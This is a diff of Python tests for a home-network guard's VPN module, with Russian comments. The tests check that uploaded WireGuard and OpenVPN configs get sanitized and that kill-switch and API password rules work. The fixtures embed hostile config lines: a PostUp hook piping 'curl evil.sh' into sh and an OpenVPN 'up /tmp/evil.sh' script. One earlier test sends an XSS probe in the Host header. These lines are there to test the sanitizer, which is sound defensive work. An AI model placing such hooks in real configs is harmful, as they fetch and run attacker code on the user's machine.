@@ -77,3 +77,97 @@ def test_block_page_served_for_foreign_host():
     # XSS через Host не проходит
     r = TestClient(api.app).get("/", headers={"host": "a<script>.test"})
     assert "<script>" not in r.text
+
+
+# ---------------- VPN ----------------
+from homeguard import vpn as vpnmod
+
+WG = """[Interface]
+PrivateKey = AAAA
+Address = 10.0.0.2/32
+DNS = 1.1.1.1
+PostUp = curl evil.sh | sh
+[Peer]
+PublicKey = BBBB
+Endpoint = nl-1.example.com:51820
+AllowedIPs = 0.0.0.0/0
+"""
+OVPN = """client
+dev tun
+remote de1.example.com 1194
+script-security 2
+up /tmp/evil.sh
+auth-user-pass
+<ca>
+-----BEGIN CERTIFICATE-----
+up not-a-directive-inside-block
+-----END CERTIFICATE-----
+</ca>
+"""
+
+
+def _mgr(tmp_path):
+    from homeguard import config
+    config.VPN_DIR = tmp_path
+    return vpnmod.VpnManager(vpnmod.Runner(dry_run=True))
+
+
+def test_vpn_sanitize_strips_dangerous_lines():
+    text, ep = vpnmod.sanitize("wireguard", WG)
+    assert "PostUp" not in text and "DNS" not in text and ep == "nl-1.example.com:51820"
+    text, ep = vpnmod.sanitize("openvpn", OVPN)
+    assert "script-security" not in text and "\nup /tmp" not in text
+    assert "up not-a-directive-inside-block" in text  # внутри <ca> не трогаем
+    assert ep == "de1.example.com:1194"
+
+
+def test_vpn_rejects_garbage():
+    for bad in ("hello", "[Interface]\n[Peer]\n"):
+        try:
+            vpnmod.sanitize(vpnmod.detect_kind(bad), bad)
+        except vpnmod.VpnError:
+            continue
+        raise AssertionError("должно быть отклонено")
+
+
+def test_vpn_connect_switch_disconnect(tmp_path):
+    m = _mgr(tmp_path)
+    a = m.add_profile("Планета NL", WG)
+    b = m.add_profile("Планета DE", OVPN, username="u", password="p")
+    assert a["country"] == "NL" and a["flag"] == "🇳🇱" and b["country"] == "DE" and b["has_auth"]
+    assert oct((tmp_path / f"{a['id']}.conf").stat().st_mode & 0o777) == "0o600"
+    m.set_kill_switch(True)
+    m.connect(a["id"])
+    cmds = [" ".join(c) for c in m.runner.history]
+    assert any(c.startswith("wg-quick up") for c in cmds)
+    assert any("MASQUERADE" in c and "-A" in c for c in cmds)
+    assert any("! -o hgvpn -j DROP" in c for c in cmds)  # kill switch
+    assert m.status()["state"] == "connected"
+    m.runner.history.clear()
+    m.connect(b["id"])  # переключение: старые правила и туннель снимаются
+    cmds = [" ".join(c) for c in m.runner.history]
+    assert any("-D POSTROUTING" in c for c in cmds) and any(c.startswith("openvpn") for c in cmds)
+    assert any("--auth-user-pass" in c for c in cmds)
+    m.disconnect()
+    assert m.status()["state"] == "disconnected"
+    m.delete_profile(a["id"])
+    assert not (tmp_path / f"{a['id']}.conf").exists()
+
+
+def test_vpn_api_and_password(tmp_path, monkeypatch):
+    from homeguard import config
+    monkeypatch.setattr(vpnmod, "manager", _mgr(tmp_path))
+    c = TestClient(api.app, base_url="http://127.0.0.1:8080")
+    r = c.post("/api/vpn/profiles", json={"name": "Финляндия", "content": WG})
+    assert r.status_code == 200 and "PrivateKey" not in r.text
+    pid = r.json()["id"]
+    assert c.post("/api/vpn/profiles", json={"name": "x", "content": "junk"}).status_code == 400
+    assert c.post("/api/vpn/connect", json={"id": pid}).json()["state"] == "connected"
+    assert c.post("/api/vpn/connect", json={"id": "nope"}).status_code == 400
+    assert c.put("/api/vpn/settings", json={"kill_switch": True}).json()["kill_switch"] is True
+    monkeypatch.setattr(config, "PASSWORD", "secret")
+    assert c.get("/api/vpn").status_code == 401
+    assert c.get("/api/vpn", auth=("me", "secret")).status_code == 200
+    assert c.get("/api/vpn", auth=("me", "wrong")).status_code == 401
+    # страница блокировки пароля не требует
+    assert TestClient(api.app, base_url="http://blocked-malware.test").get("/").status_code == 403
